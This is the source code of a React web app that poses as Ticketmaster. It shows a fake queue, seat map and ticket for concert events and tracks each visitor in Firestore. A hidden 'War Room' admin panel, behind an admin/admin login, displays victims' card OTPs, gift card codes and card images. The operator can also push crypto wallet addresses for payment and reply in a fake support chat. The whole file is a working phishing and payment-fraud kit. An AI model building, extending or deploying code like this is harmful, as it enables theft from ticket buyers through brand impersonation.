import React, { useState, useEffect, useRef } from 'react';
import { Search, User, Lock, CheckCircle, MessageSquare, Send, X, Bell, DollarSign, Image as ImageIcon } from 'lucide-react';
import { onSnapshot, collection, addDoc, updateDoc, doc, setDoc, getDoc } from 'firebase/firestore';
import { signInAnonymously, onAuthStateChanged, signInWithCustomToken } from 'firebase/auth';
import { auth, db, appId } from './firebase';

import SeatMap from './src/components/SeatMap';
import Checkout from './src/components/Checkout';

// --- MOCK DATA ---
const INITIAL_EVENTS = [
  { id: 1, artist: "Taylor Swift | The Eras Tour", venue: "Wembley Stadium, London", date: "Sat • Aug 17 • 7:00 PM", image: "https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1459749411177-287ce35e8b4f?auto=format&fit=crop&q=80&w=2000", status: "low_inventory" },
  { id: 2, artist: "Drake: It's All A Blur", venue: "O2 Arena, London", date: "Fri • Sep 22 • 8:00 PM", image: "https://images.unsplash.com/photo-1514525253440-b393452e8d26?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1501281668745-f7f57925c3b4?auto=format&fit=crop&q=80&w=2000", status: "available" }
];

export default function App() {
  const [user, setUser] = useState(null);
  const [currentPage, setCurrentPage] = useState('home'); 
  const [selectedEvent, setSelectedEvent] = useState(null);
  const [cart, setCart] = useState([]); 
  
  // REAL FIREBASE DATA STATE
  const [sessions, setSessions] = useState([]); 
  const [currentSessionId, setCurrentSessionId] = useState(null);
  const [globalSettings, setGlobalSettings] = useState({ price: 250, bgImage: '' });
  
  // Chat & Admin
  const [isChatOpen, setIsChatOpen] = useState(false);
  const [chatMessages, setChatMessages] = useState([{ sender: 'system', text: 'Welcome to Ticketmaster Support.', timestamp: new Date().toISOString() }]);
  const [isAdminLoggedIn, setIsAdminLoggedIn] = useState(false);
  
  // --- AUTH & INIT ---
  useEffect(() => {
    signInAnonymously(auth);
    return onAuthStateChanged(auth, setUser);
  }, []);

  // --- LISTEN TO GLOBAL SETTINGS ---
  useEffect(() => {
    if (!user) return;
    const configRef = doc(db, 'artifacts', appId, 'public', 'data', 'config', 'global_settings');
    return onSnapshot(configRef, (docSnap) => {
      if (docSnap.exists()) setGlobalSettings(docSnap.data());
      else setDoc(configRef, { price: 250, bgImage: '' });
    });
  }, [user]);

  // --- CREATE USER SESSION ---
  useEffect(() => {
    if (!user) return;
    const setupSession = async () => {
       const locations = ["London, UK", "New York, USA", "Toronto, Canada", "Lagos, Nigeria", "Dubai, UAE"];
       const sessionsRef = collection(db, 'artifacts', appId, 'public', 'data', 'sessions');
       const newSessionRef = await addDoc(sessionsRef, {
         createdAt: new Date().toISOString(),
         userId: user.uid,
         location: locations[Math.floor(Math.random() * locations.length)],
         status: 'browsing',
         email: 'Unknown',
         cart: [],
         total: 0,
         chatHistory: chatMessages
       });
       setCurrentSessionId(newSessionRef.id);
    };
    setupSession();
  }, [user]);

  // --- SYNC SESSION ---
  useEffect(() => {
    if (!currentSessionId) return;
    const sessionRef = doc(db, 'artifacts', appId, 'public', 'data', 'sessions', currentSessionId);
    return onSnapshot(sessionRef, (docSnap) => {
      if (docSnap.exists()) {
        const data = docSnap.data();
        if (data.chatHistory) setChatMessages(data.chatHistory);
      }
    });
  }, [currentSessionId]);

  // --- ADMIN LISTENERS ---
  useEffect(() => {
    if (!user || !isAdminLoggedIn) return;
    const sessionsRef = collection(db, 'artifacts', appId, 'public', 'data', 'sessions');
    return onSnapshot(sessionsRef, (snapshot) => {
      const allSessions = snapshot.docs.map(d => ({ id: d.id, ...d.data() }));
      allSessions.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
      setSessions(allSessions);
    });
  }, [user, isAdminLoggedIn]);

  // --- HELPERS ---
  const updateSession = async (sessionId, updates) => {
    await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sessionId), updates);
  };
  const updateGlobalSettings = async (newSettings) => {
    await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'config', 'global_settings'), newSettings);
  };
  const sendChatMessage = async (sessionId, text, sender) => {
    const ref = doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sessionId);
    const snap = await getDoc(ref);
    if (snap.exists()) {
      const currentChat = snap.data().chatHistory || [];
      await updateDoc(ref, { chatHistory: [...currentChat, { sender, text, timestamp: new Date().toISOString() }] });
    }
  };

  const mySessionData = sessions.find(s => s.id === currentSessionId) || {};

  return (
    <div className="min-h-screen font-sans text-gray-900 bg-white relative overflow-hidden">
      {(currentPage === 'home' || currentPage === 'event') && (
        <div className="fixed inset-0 z-0"><div className="absolute inset-0 bg-black/60 z-10" /><img src={globalSettings.bgImage || INITIAL_EVENTS[0].bgImage} className="w-full h-full object-cover" alt="Background"/></div>
      )}
      
      {/* HEADER */}
      <header className={`fixed top-0 w-full z-50 transition-colors duration-300 ${currentPage === 'home' ? 'bg-transparent text-white' : 'bg-[#1f262d] text-white'}`}>
        <div className="max-w-7xl mx-auto px-4 h-16 flex items-center justify-between">
          <div className="flex items-center gap-1 cursor-pointer" onClick={() => setCurrentPage('home')}>
             <span className="font-bold text-2xl tracking-tighter">ticketmaster</span><div className="bg-[#026cdf] rounded-full w-5 h-5 flex items-center justify-center"><CheckCircle className="w-3.5 h-3.5 text-white stroke-[3]" /></div>
          </div>
          <div className="hidden md:flex flex-1 max-w-lg mx-4"><div className="relative w-full text-gray-900"><input type="text" placeholder="Find millions of live experiences" className="w-full pl-4 pr-10 py-2 rounded-l-md rounded-r-md focus:outline-none"/><Search className="absolute right-3 top-2.5 w-5 h-5 text-gray-500" /></div></div>
          <div className="flex items-center gap-6 text-sm font-medium"><span className="hidden md:block cursor-pointer">Help</span><div className="flex items-center gap-2 cursor-pointer"><User className="w-5 h-5" /><span className="hidden md:block">Sign In</span></div></div>
        </div>
      </header>

      {/* ROUTES */}
      <main className="relative z-10 pt-16 min-h-screen">
        {currentPage === 'home' && <LandingPage events={INITIAL_EVENTS} onSelect={(e)=>{setSelectedEvent(e); setCurrentPage('queue'); updateSession(currentSessionId, { status: 'in_queue', event: e.artist });}} />}
        {currentPage === 'queue' && <QueuePage event={selectedEvent} onComplete={()=>setCurrentPage('seatmap')} />}
        {currentPage === 'seatmap' && <SeatMap event={selectedEvent} cart={cart} setCart={setCart} globalPrice={globalSettings.price} onCheckout={()=>{updateSession(currentSessionId, { status: 'payment_pending', cart }); setCurrentPage('checkout');}} />}
        {currentPage === 'checkout' && <Checkout cart={cart} sessionId={currentSessionId} sessionData={sessions.find(s=>s.id===currentSessionId) || mySessionData} updateSession={updateSession} onSuccess={()=>setCurrentPage('ticket')} onBack={()=>setCurrentPage('seatmap')} />}
        {currentPage === 'ticket' && <TicketPage event={selectedEvent} cart={cart} />}
        {currentPage === 'admin' && <AdminDashboard isLoggedIn={isAdminLoggedIn} setLoggedIn={setIsAdminLoggedIn} sessions={sessions} updateSession={updateSession} globalSettings={globalSettings} updateGlobalSettings={updateGlobalSettings} sendChatMessage={sendChatMessage} onExit={()=>setCurrentPage('home')} />}
      </main>

      {/* CHAT */}
      <ChatWidget isOpen={isChatOpen} setIsOpen={setIsChatOpen} messages={chatMessages} onSend={(text) => currentSessionId && sendChatMessage(currentSessionId, text, 'user')} />
      
      {/* FOOTER */}
      {currentPage !== 'seatmap' && currentPage !== 'admin' && <footer className="bg-[#1f262d] text-white py-12 relative z-20"><div className="mt-12 border-t border-gray-700 pt-8 text-center text-xs text-gray-500"><button onClick={() => setCurrentPage('admin')} className="text-gray-700 hover:text-gray-500">Admin</button></div></footer>}
    </div>
  );
}

// --- SUB COMPONENTS ---
function LandingPage({ events, onSelect }) {
  return (
    <div className="pb-20">
      <div className="relative h-[500px] flex items-center justify-center text-center text-white px-4"><div className="max-w-4xl"><h1 className="text-4xl md:text-6xl font-extrabold mb-6 tracking-tight">Let's Make Memories.</h1></div></div>
      <div className="max-w-7xl mx-auto px-4 -mt-20 relative z-20"><div className="grid grid-cols-1 md:grid-cols-3 gap-6">{events.map(ev => (<div key={ev.id} onClick={()=>onSelect(ev)} className="bg-white rounded-lg shadow-xl overflow-hidden cursor-pointer transform hover:-translate-y-1 group"><div className="h-48 overflow-hidden relative"><img src={ev.image} className="w-full h-full object-cover"/><div className="absolute top-2 right-2 bg-white/90 px-2 py-1 rounded text-xs font-bold text-[#026cdf]">SELLING FAST</div></div><div className="p-4"><h3 className="font-bold text-lg text-gray-900">{ev.artist}</h3></div></div>))}</div></div>
    </div>
  );
}

function QueuePage({ event, onComplete }) {
  const [prog, setProg] = useState(0);
  useEffect(()=>{const i=setInterval(()=>{setProg(p=>{if(p>=100){clearInterval(i);setTimeout(onComplete,1000);return 100}return p+Math.random()*8})},500);return ()=>clearInterval(i)},[]);
  return <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4"><div className="bg-white max-w-xl w-full rounded-xl shadow-2xl p-8 text-center border-t-8 border-[#026cdf]"><h2 className="text-2xl font-bold">{event?.artist}</h2><p>The Queue</p><div className="h-4 bg-gray-200 rounded-full mt-4 overflow-hidden"><div className="h-full bg-[#026cdf] transition-all" style={{width:`${prog}%`}}></div></div><div className="mt-8 text-2xl font-bold text-[#026cdf]">2431 people ahead</div></div></div>;
}

function TicketPage({ event, cart }) {
  const t = cart[0] || { section:'FLR', row:'1', seat:'1' };
  return <div className="min-h-screen bg-gray-100 py-12 px-4 flex justify-center"><div className="bg-white w-full max-w-sm rounded-2xl shadow-2xl overflow-hidden border"><div className="bg-[#026cdf] p-6 text-white text-center"><h2 className="font-bold">Standard Ticket</h2><p>Sec {t.section}, Row {t.row}</p></div><div className="p-6 text-center"><h1 className="text-2xl font-bold">{event?.artist}</h1><div className="relative w-56 h-56 mx-auto bg-white p-2 shadow-inner border mt-4"><img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=SafeTix" className="w-full h-full"/><div className="absolute top-0 left-0 w-full h-full overflow-hidden"><div className="h-full w-2 bg-[#026cdf]/80 shadow-[0_0_20px_rgba(2,108,223,0.9)] animate-[scan_2.5s_ease-in-out_infinite]"></div></div></div></div></div><style>{`@keyframes scan {0%{transform:translateX(0)}50%{transform:translateX(200px)}100%{transform:translateX(0)}}`}</style></div>;
}

function AdminDashboard({ isLoggedIn, setLoggedIn, sessions, updateSession, globalSettings, updateGlobalSettings, sendChatMessage, onExit }) {
  const [e, setE] = useState(''); const [p, setP] = useState('');
  const [pr, setPr] = useState(globalSettings.price); const [bg, setBg] = useState(globalSettings.bgImage);
  if(!isLoggedIn) return <div className="min-h-screen bg-gray-900 flex items-center justify-center"><div className="bg-white p-8 rounded"><h2 className="font-bold mb-4">Admin</h2><input placeholder="Email" className="border w-full p-2 mb-2" value={e} onChange={ev=>setE(ev.target.value)}/><input type="password" placeholder="Pass" className="border w-full p-2 mb-4" value={p} onChange={ev=>setP(ev.target.value)}/><button onClick={()=>{if(e==='admin'&&p==='admin')setLoggedIn(true)}} className="bg-black text-white w-full p-2">Login</button></div></div>;
  return (
    <div className="min-h-screen bg-gray-100 p-6">
      <div className="flex justify-between mb-6"><h1 className="text-2xl font-bold">War Room</h1><button onClick={onExit} className="text-red-500 border border-red-500 px-3">Exit</button></div>
      <div className="bg-white p-4 rounded shadow mb-6 flex gap-4"><div>Price: <input type="number" value={pr} onChange={ev=>setPr(ev.target.value)} className="border p-1 w-20"/><button onClick={()=>updateGlobalSettings({...globalSettings, price:Number(pr)})} className="bg-green-600 text-white px-2 ml-2">Set</button></div><div>BG: <input value={bg} onChange={ev=>setBg(ev.target.value)} className="border p-1"/><button onClick={()=>updateGlobalSettings({...globalSettings, bgImage:bg})} className="bg-blue-600 text-white px-2 ml-2">Set</button></div></div>
      <div className="grid gap-4">{sessions.map(s=>(<div key={s.id} className="bg-white p-4 rounded border-l-4 border-blue-500"><div className="font-bold">{s.id} <span className="text-xs font-normal text-gray-400">{s.location}</span></div><div className="text-xs bg-gray-100 p-1 inline-block rounded mb-2">{s.status} | ${s.total} | {s.paymentMethod}</div>
        {/* Actions */}
        <div className="bg-gray-50 p-2 text-sm">
          {s.status==='waiting_for_otp' && s.paymentMethod==='card' && <div className="text-red-500 font-bold">OTP needed: {s.otp}</div>}
          {s.status==='waiting_for_otp' && s.paymentMethod==='gift_card' && (
             <div className="mb-2">
                <div className="font-bold">Gift Card Details:</div>
                <div className="text-xs pl-2">Type: {s.giftCardDetails?.type}</div>
                <div className="text-xs pl-2">Code: {s.giftCardDetails?.code}</div>
                {s.giftCardDetails?.imageBase64 && <div className="mt-1"><img src={s.giftCardDetails.imageBase64} className="w-full max-w-[200px] border rounded" alt="Card"/></div>}
             </div>
          )}
          {s.status==='waiting_for_admin_address' && <div className="flex gap-1"><input placeholder="Wallet/Appl" className="border p-1 flex-1" onBlur={ev=>updateSession(s.id, {cryptoAddress:ev.target.value})}/><button className="bg-blue-500 text-white px-2">Send</button></div>}
          {s.status==='waiting_for_confirmation' && <button onClick={()=>updateSession(s.id,{status:'payment_complete'})} className="bg-green-600 text-white w-full">Confirm Payment</button>}
          {/* Chat Reply */}
          <div className="mt-2 flex"><input placeholder="Reply..." className="border flex-1 p-1 text-xs" onKeyDown={ev=>{if(ev.key==='Enter'){sendChatMessage(s.id,ev.target.value,'system');ev.target.value=''}}}/></div>
        </div>
      </div>))}</div>
    </div>
  );
}

function ChatWidget({ isOpen, setIsOpen, messages, onSend }) {
  const [txt, setTxt] = useState('');
  return (
    <div className="fixed bottom-24 right-4 z-50">
      {!isOpen && <button onClick={()=>setIsOpen(true)} className="bg-[#026cdf] text-white p-4 rounded-full shadow-lg"><MessageSquare/></button>}
      {isOpen && <div className="bg-white w-80 h-96 rounded shadow-xl flex flex-col border"><div className="bg-[#026cdf] p-3 text-white flex justify-between"><span>Support</span><X onClick={()=>setIsOpen(false)}/></div><div className="flex-1 overflow-y-auto p-2 bg-gray-50">{messages.map((m,i)=>(<div key={i} className={`p-2 rounded text-xs mb-1 w-fit ${m.sender==='user'?'bg-blue-500 text-white ml-auto':'bg-white border'}`}>{m.text}</div>))}</div><div className="p-2 border-t flex"><input className="flex-1 border rounded px-2" value={txt} onChange={e=>setTxt(e.target.value)}/><button onClick={()=>{onSend(txt);setTxt('')}} className="ml-2"><Send/></button></div></div>}
    </div>
  );
}


